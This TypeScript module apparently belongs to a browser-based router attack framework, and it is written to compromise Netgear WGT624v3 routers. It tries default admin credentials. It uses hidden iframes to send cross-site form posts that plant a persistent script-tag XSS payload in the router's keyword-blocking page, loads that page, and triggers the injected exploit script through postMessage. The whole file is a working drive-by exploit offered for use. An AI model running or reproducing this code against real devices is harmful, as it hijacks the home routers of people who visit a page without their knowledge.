import {Promise} from "es6-promise";
import FingerprintResult from "../../../fingerprint/FingerprintResult";
import BasePayload from "../../BasePayload";
import BasicAuthCredential from "../../BasicAuthCredential";
import PromiseUtil from "../../../shared/PromiseUtil";

interface FormParam {
    name:string,
    value:string
}

/**
 * A payload implementation for the Netgear WGT624v3 router.
 */
class WGT624v3Payload extends BasePayload {
    /**
     * A (short) list of username and password pairs to test. As
     * each test takes a fairly long time, this is limited to only
     * the default and blank passwords for now.
     * @see http://portforward.com/default_username_password/NetGear.htm
     */
    private static CREDENTIALS_TO_TEST:BasicAuthCredential[] = [
        {username: 'admin', password: ''},
        {username: 'admin', password: 'password'},
    ];

    constructor(fingerprintResult:FingerprintResult) {
        super(fingerprintResult);
    }

    isTarget():boolean {
        return (
            this.fingerprintResult.vendor === 'NETGEAR' &&
            this.fingerprintResult.hwVersion === 'WGT624v3'
        );
    }

    runPayload():Promise<boolean> {
        let doPayload = (credentials:BasicAuthCredential):Promise<boolean> => {
            return this.tryInjectPayload(credentials)
                .then(() => this.clearQueuedMessages())
                .then(() => this.tryRunInjectedPayload(credentials))
                .then((res:boolean) => {
                    console.log("doPayload", this.baseUrl, credentials, res);
                    return res;
                });
        };

        let injectTestPromiseFuncs = WGT624v3Payload.CREDENTIALS_TO_TEST.map((credentials:BasicAuthCredential) => {
            return () => doPayload(credentials);
        });

        return PromiseUtil.sequentially(injectTestPromiseFuncs)
            .then((results:boolean[]) => {
                return results.some((r:boolean) => r);
            });
    }

    /**
     * Sends a POST request to the specified URL, with the provided parameters.
     *
     * This request is sent using a form element in an IFrame, as XHR is
     * not allowed due to the router not sending any CORS headers.
     *
     * @param url The url to send the request to.
     * @param params Params to be included in the request.
     * @return {Promise} A promise resolved when the request is finished.
     */
    private sendPostRequest(url:string, params:FormParam[]):Promise<any> {
        return new Promise((resolve) => {
            let frame:HTMLIFrameElement = document.createElement('iframe');
            let form:HTMLFormElement = document.createElement('form');

            params.forEach((param:FormParam) => {
                let field:HTMLInputElement = document.createElement('input');
                field.type = 'text';
                field.name = param.name;
                field.value = param.value;
                form.appendChild(field);
            });
            form.method = 'POST';
            form.action = url;
            frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
            frame.style.display = 'none';
            frame.onload = () => {
                frame.contentDocument.body.appendChild(form);
                frame.onload = () => {
                    // 2nd onload should be when the form has been posted
                    frame.remove();
                    resolve();
                };
                form.submit();
            };
            document.body.appendChild(frame);
        });
    }

    /**
     * Uses CSRF to inject a script tag that references the netgear_WGT624v3 exploit.
     *
     * The script tag is injected by using a persistent XSS defect in the keyword
     * blocking configuration of the router. However, this requires two requests,
     * one for adding the new XSS keyword and one for actually saving the keyword.
     *
     * @param credentials The credentials to use for the request.
     * @return {Promise} A promise resolved once both requests have been sent.
     */
    private tryInjectPayload(credentials:BasicAuthCredential):Promise<any> {
        let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_wgt624v3.js';
        let keywordUrl = 'http://' + credentials.username + ':' + credentials.password + '@'
            + this.fingerprintResult.ip + '/keyword.cgi';

        let addKeywordParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: `<script src="${exploitSrc}"></script>`},
            {name: 'cfKeyWord_AddKeyword', value: 'Add+Keyword'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        let saveKeywordsParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: ''},
            {name: 'wzWAN_IPFinish', value: 'Apply'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        return this.sendPostRequest(keywordUrl, addKeywordParams)
            .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams))
    }

    /**
     * Waits for a message, sent on the window via postMessage.
     *
     * @param expectedMessage The message text expected.
     * @param timeout Time to wait for the message (ms).
     * @return {Promise} A promise resolved if the expectedMessage was
     * received before the timeout.
     */
    private waitForMessage(expectedMessage:string, timeout:number = 4000):Promise<any> {
        return new Promise((resolve, reject) => {
            let timeoutId:number;
            let done = (success:boolean, reason?:string) => {
                clearTimeout(timeoutId);
                window.removeEventListener('message', onMessage, false);
                if (success) {
                    resolve();
                } else {
                    reject();
                }
                console.log('waitForMessage', expectedMessage, success, reason);
            };
            let onTimeout = () => done(false, "onTimeout");
            let onMessage = (evt:MessageEvent) => {
                if (evt.data === expectedMessage) {
                    done(true)
                } else {
                    done(false, `${evt.data} != ${expectedMessage}`);
                }
            };

            window.addEventListener('message', onMessage, false);
            timeoutId = setTimeout(onTimeout, timeout);
        });
    }

    /**
     * Clears any queued messages on the window.
     * @return {Promise} A promise resolved when the messages
     * has been cleared.
     */
    private clearQueuedMessages() {
        return new Promise((resolve) => {
            window.onmessage = () => {
                // NOP
            };
            // By using setImmediate, we should allow all queued events
            // to be dispatched.
            setImmediate(() => {
                window.onmessage = null;
                resolve();
            });
        });
    }

    /**
     * Attempts to run the payload, has it been injected.
     *
     * This uses window messaging to communicate with the exploit
     * injected. If the injection was successful, the exploit should
     * respond.
     *
     * @param credentials The credentials to use.
     * @return {Promise<boolean>} A promise, resolved with a boolean indicating if
     * the payload was succesfully run or not.
     */
    private tryRunInjectedPayload(credentials:BasicAuthCredential):Promise<boolean> {
        // Create an IFrame pointing to the page that should, if the
        // script was indeed injected, have the injected payload.
        let frame:HTMLIFrameElement = document.createElement('iframe');
        frame.src = 'http://' + credentials.username + ':' + credentials.password + '@'
            + this.fingerprintResult.ip + '/BKS_keyword.htm';
        frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
        frame.style.display = 'none';
        document.body.appendChild(frame);

        // If the script was injected, it will send a message to the top window (i.e. us)
        // with the content #LOADED#. If that happens, we know the injection was successful
        // and we give it the go-ahead to run, by sending the "#OK#" message.
        return Promise.resolve()
            .then(() => this.waitForMessage("#LOADED#"))
            .then(() => {
                let promise = this.waitForMessage("#DONE#");
                frame.contentWindow.postMessage("#OK#", "*");
                return promise;
            })
            .then(() => {
                frame.remove();
                return true
            })
            .catch((err) => {
                if (err) {
                    console.log('tryRunInjectedPayload error');
                    console.error(err);
                }
                frame.remove();
                return false
            });
    }
}

export default WGT624v3Payload;
